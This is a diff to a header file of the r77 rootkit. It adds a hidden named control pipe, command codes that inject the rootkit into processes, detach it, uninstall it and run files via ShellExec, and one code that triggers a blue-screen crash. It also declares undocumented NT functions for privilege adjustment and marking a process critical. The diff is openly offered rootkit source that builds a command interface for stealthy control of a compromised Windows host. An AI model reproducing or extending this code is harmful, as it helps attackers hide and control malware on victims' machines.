@@ -71,6 +71,16 @@
 #define CHILD_PROCESS_PIPE_NAME64				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc64"
 
 /// <summary>
+/// Name for the named pipe that receives commands from external processes.
+/// </summary>
+#define CONTROL_PIPE_NAME						L"\\\\.\\pipe\\" HIDE_PREFIX L"control"
+/// <summary>
+/// Name for the internally used named pipe of the 64-bit r77 service that receives redirected commands from the 32-bit r77 service.
+/// <para>Do not use! Always use CONTROL_PIPE_NAME.</para>
+/// </summary>
+#define CONTROL_PIPE_REDIRECT64_NAME			L"\\\\.\\pipe\\" HIDE_PREFIX L"control_redirect64"
+
+/// <summary>
 /// Specifies a list of processes that will not be injected.
 /// By default, this list includes processes that are known to cause problems.
 /// To customize this list, add custom entries and recompile.
@@ -79,9 +89,54 @@
 // Example: { L"MSBuild.exe", L"your_app.exe", L"another_app.exe" }
 
 /// <summary>
+/// The control code that terminates the r77 service.
+/// </summary>
+#define CONTROL_R77_TERMINATE_SERVICE			0x1001
+/// <summary>
+/// The control code that uninstalls r77.
+/// </summary>
+#define CONTROL_R77_UNINSTALL					0x1002
+/// <summary>
+/// The control code that temporarily pauses injection of new processes.
+/// </summary>
+#define CONTROL_R77_PAUSE_INJECTION				0x1003
+/// <summary>
+/// The control code that resumes paused injection of new processes.
+/// </summary>
+#define CONTROL_R77_RESUME_INJECTION			0x1004
+/// <summary>
+/// The control code that injects r77 into a specific process, if it is not yet injected.
+/// </summary>
+#define CONTROL_PROCESSES_INJECT				0x2001
+/// <summary>
+/// The control code that injects r77 into all processes that are not yet injected.
+/// </summary>
+#define CONTROL_PROCESSES_INJECT_ALL			0x2002
+/// <summary>
+/// The control code that detaches r77 from a specific process.
+/// </summary>
+#define CONTROL_PROCESSES_DETACH				0x2003
+/// <summary>
+/// The control code that detaches r77 from all processes.
+/// </summary>
+#define CONTROL_PROCESSES_DETACH_ALL			0x2004
+/// <summary>
+/// The control code that executes a file using ShellExec.
+/// </summary>
+#define CONTROL_USER_SHELLEXEC					0x3001
+/// <summary>
+/// The control code that triggers a BSOD.
+/// </summary>
+#define CONTROL_SYSTEM_BSOD						0x4001
+
+/// <summary>
 /// A callback that notifies about a process ID.
 /// </summary>
 typedef VOID(*PROCESSIDCALLBACK)(DWORD processId);
+/// <summary>
+/// A callback that notifies the r77 service about a command.
+/// </summary>
+typedef VOID(*CONTROLCALLBACK)(DWORD controlCode, HANDLE pipe);
 
 /// <summary>
 /// Defines a collection of ULONG values.
@@ -328,6 +383,17 @@ BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength);
 /// otherwise, FALSE.
 /// </returns>
 BOOL ReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size);
+/// <summary>
+/// Reads a null terminated LPCWSTR from the specified file.
+/// </summary>
+/// <param name="file">A file handle to read the string from.</param>
+/// <param name="str">The buffer to write the string to.</param>
+/// <param name="length">The length of the string buffer.</param>
+/// <returns>
+/// TRUE, if this function succeeds;
+/// FALSE, if the string was longer than the specified buffer, or the end of the file was reached before the null terminator.
+/// </returns>
+BOOL ReadFileStringW(HANDLE file, PWCHAR str, DWORD length);
 /// <summary>
 /// Writes a buffer to a file.
 /// </summary>
@@ -649,8 +715,16 @@ BOOL HookChildProcess(DWORD processId);
 /// </returns>
 PNEW_PROCESS_LISTENER NewProcessListener(DWORD interval, PROCESSIDCALLBACK callback);
 
+/// <summary>
+/// Creates a new listener for the control pipe that receives commands from any process.
+/// </summary>
+/// <param name="callback">The function that is called, when a command is received by another process.</param>
+VOID ControlPipeListener(CONTROLCALLBACK callback);
+
 namespace nt
 {
 	NTSTATUS NTAPI NtQueryObject(HANDLE handle, nt::OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
 	NTSTATUS NTAPI NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
+	NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue);
+	NTSTATUS NTAPI RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb);
 }
